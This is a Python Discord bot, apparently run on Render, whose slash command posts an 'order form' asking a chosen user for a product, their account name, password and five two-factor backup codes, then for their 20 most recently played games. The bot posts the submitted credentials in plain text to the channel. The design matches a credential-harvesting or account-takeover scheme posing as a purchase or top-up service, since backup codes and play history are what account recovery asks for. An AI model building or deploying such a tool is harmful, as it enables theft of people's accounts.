import os
import discord
from discord import app_commands
from discord.ext import commands, tasks
from flask import Flask
import threading
import requests
import time

# ======== Discord Bot 設定 ========
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# ======== Flask Web 伺服器（保持 Render 容器存活） ========
app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running ✅"

# ======== 上線事件 ========
@bot.event
async def on_ready():
    print(f"✅ 已登入為 {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"🌐 已同步 {len(synced)} 個斜線指令")
    except Exception as e:
        print(f"同步錯誤: {e}")

# ======== 訂單 Modal ========
class OrderModal(discord.ui.Modal, title="🛒 填寫表單"):
    product = discord.ui.TextInput(label="所需商品", placeholder="例如：1000R")
    account = discord.ui.TextInput(label="帳號", placeholder="輸入帳號")
    password = discord.ui.TextInput(label="密碼", style=discord.TextStyle.short, placeholder="輸入密碼")
    backup_codes = discord.ui.TextInput(
        label="五組備用碼 請以空格分開",
        style=discord.TextStyle.paragraph,
        placeholder="例如：1234 5678 9012 3456 7890"
    )

    def __init__(self, user: discord.User, channel: discord.TextChannel):
        super().__init__()
        self.target_user = user
        self.target_channel = channel

    async def on_submit(self, interaction: discord.Interaction):
        codes = self.backup_codes.value.split()
        formatted_codes = "\n".join([f"🔹 {c}" for c in codes])

        embed = discord.Embed(
            title="📦 新訂單提交",
            color=discord.Color.blue()
        )
        embed.add_field(name="💰 所需商品", value=self.product.value, inline=False)
        embed.add_field(name="🧾 帳號", value=self.account.value, inline=False)
        embed.add_field(name="🔑 密碼", value=self.password.value, inline=False)
        embed.add_field(name="🧩 備用碼", value=formatted_codes or "無", inline=False)

        await self.target_channel.send(embed=embed)
        await interaction.response.send_message("✅ 表單已提交！", ephemeral=True)

# ======== 按鈕介面 ========
class OrderButton(discord.ui.View):
    def __init__(self, user: discord.User):
        super().__init__(timeout=None)
        self.user = user

    @discord.ui.button(label="📝 填寫訂單", style=discord.ButtonStyle.primary)
    async def fill_order(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user.id:
            await interaction.response.send_message("❌ 這不是給你的表單喔！", ephemeral=True)
            return
        try:
            modal = OrderModal(user=self.user, channel=interaction.channel)
            await interaction.response.send_modal(modal)
        except Exception as e:
            await interaction.response.send_message(f"⚠️ 無法開啟表單，請稍後再試。\n```{e}```", ephemeral=True)

# ======== 斜線指令 ========
@bot.tree.command(name="開啟訂單", description="建立一個填寫訂單的表單介面")
@app_commands.describe(user="選擇可以填寫此訂單的用戶")
async def open_order(interaction: discord.Interaction, user: discord.User):
    embed = discord.Embed(
        title="🛒 訂單填寫表單",
        description=f"{user.mention} 麻煩點選下面的按鈕填寫所需商品、帳號、密碼、備用碼。送出後請提供最近遊玩的20款遊戲，感謝配合！",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed, view=OrderButton(user))

# ======== Flask Web 伺服器 ========
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ======== 自動 ping 自己防休眠 ========
def keep_alive():
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        print("⚠️ 沒有找到 RENDER_EXTERNAL_URL 環境變數，無法自動 ping")
        return

    def ping_loop():
        while True:
            try:
                requests.get(url)
                print("💡 Ping 自己成功")
            except Exception as e:
                print(f"❌ Ping 自己失敗: {e}")
            time.sleep(600)  # 每10分鐘 ping 一次

    threading.Thread(target=ping_loop, daemon=True).start()

# ======== 啟動 ========
threading.Thread(target=run_flask).start()
keep_alive()
bot.run(os.environ.get("DISCORD_TOKEN"))
